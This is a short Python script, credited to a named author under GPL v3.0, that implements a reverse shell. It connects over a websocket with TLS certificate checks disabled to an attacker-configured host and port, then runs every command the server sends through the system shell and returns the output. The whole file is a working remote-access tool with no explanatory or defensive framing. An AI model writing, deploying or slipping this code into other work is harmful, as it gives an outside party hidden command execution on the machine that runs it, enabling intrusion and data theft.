__author__ = "赵博凯"
__license__ = "GPL v3.0"

import asyncio
import websockets
import subprocess
import ssl

HOST = '127.0.0.1' # your ip
PORT = 1234 # your port

async def execute_command(command):
    return subprocess.run(command, shell=True, capture_output=True, text=True)

async def main():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    async with websockets.connect(f'wss://{HOST}:{PORT}', ssl=ssl_context) as websocket:
        while True:
            try:
                command = await websocket.recv()
                if command == 'exit':
                    break
                result = await execute_command(command)
                await websocket.send(result.stdout)
            except Exception as e:
                await websocket.send(f"ERROR:{e}")

if __name__ == "__main__":
    asyncio.run(main())
